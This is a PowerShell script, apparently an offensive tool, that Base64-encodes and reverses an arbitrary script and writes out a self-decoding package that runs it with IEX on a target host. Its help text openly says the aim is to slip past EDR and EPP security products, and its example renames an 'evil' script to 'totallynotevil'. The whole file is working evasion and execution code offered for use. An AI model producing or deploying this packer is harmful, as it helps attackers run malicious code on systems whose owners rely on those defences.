<#
.SYNOPSIS
    Obfuscate PowerShell scripts and create package with decoder and execution of the script
.DESCRIPTION
    Takes a PowerShell (or any other content) script and encodes it to Base64, then inverts the resulting string to bypass EDR and EPP.
    The resulting string is written to a file, with the required decode function included and saved as a ps1, for easy execution on the target host.
    Just copy your new file to the target host, hopefully no longer being blocked by EPP/EDR, and run it. It will decode the script and Invoke-Execute it (at which point EDR/EPP might pick it up unless AMSI has been bypassed.
.PARAMETER FilePath
    The full path to the file you wish to encode
.PARAMETER OutFile
    The full path to where you want your obfuscated package to be written to
.EXAMPLE
    Reverser.ps1 -FilePath "c:\users\yourname\desktop\evilpowershell.ps1" -OutFile "c:\users\yourname\desktop\totallynotevilpowershell.ps1"
#>

[CmdletBinding()]
param 
(
    [string] $FilePath,
    [string] $OutFile
)    


function EncodeAndReverse()
{
    [CmdletBinding()]
    param 
    (
        [string] $FileURI
    )

    $File = [System.IO.File]::ReadAllBytes($FileURI);

    $Base64String = [System.Convert]::ToBase64String($File);
    
    Write-Debug "Original encoded string:"
    Write-Debug $Base64String
    
    $Base64Array = $Base64String.ToCharArray()
    [array]::Reverse($Base64Array)
    $ReversedBase64String = -join($Base64Array)
    
    Write-Debug "Encoded and reversed content:"
    Write-Debug $ReversedBase64String
    return $ReversedBase64String
}

function ReverseAndDecode()
{
    [CmdletBinding()]
    param 
    (
        [string] $ReversedString
    )
    $ReversedBase64Array = $ReversedString.ToCharArray()
    [array]::Reverse($ReversedBase64Array)
    $Base64String = -join($ReversedBase64Array)
    Write-Debug "Re-reversed string:"
    Write-Debug $Base64String
    $DecodedArray = [Convert]::FromBase64String($Base64String)
    
    Write-Debug "Decoded string:"
    $text = [String]::new($DecodedArray)
    Write-Debug $text
    return $text
}

function ReverseAndExecute()
{
    [CmdletBinding()]
    param 
    (
        [string] $ReversedString
    )
    $ReversedBase64Array = $ReversedString.ToCharArray()
    [array]::Reverse($ReversedBase64Array)
    $Base64String = -join($ReversedBase64Array)
    Write-Debug "Re-reversed string:"
    Write-Debug $Base64String
    $DecodedArray = [Convert]::FromBase64String($Base64String)
    
    Write-Debug "Decoded string:"
    $text = [String]::new($DecodedArray)
    Write-Debug $text
    IEX $text
}


$MyReversedString = EncodeAndReverse -FileURI $FilePath
#Write-Output $MyReversedString
#ReverseAndDecode -ReversedString $MyReversedString
# ReverseAndExecute -ReversedString $MyReversedString



$ReverseAndExecuteFunction = "
function ReverseAndExecute()
{
    [CmdletBinding()]
    param 
    (
        [string] `$ReversedString
    )
    `$ReversedBase64Array = `$ReversedString.ToCharArray()
    [array]::Reverse(`$ReversedBase64Array)
    `$Base64String = -join(`$ReversedBase64Array)
    `$DecodedArray = [Convert]::FromBase64String(`$Base64String)
    
    `$text = [String]::new(`$DecodedArray)
    IEX `$text
}
"

Write-Output $ReverseAndExecuteFunction | Out-File -FilePath $OutFile -Append
Write-Output "`$MyPayload = " `"$MyReversedString`" | Out-File -FilePath $OutFile -Append -NoNewline
Write-Output " "| Out-File -FilePath $OutFile -Append
Write-Output "ReverseAndExecute -ReversedString `$MyPayload" | Out-File -FilePath $OutFile -Append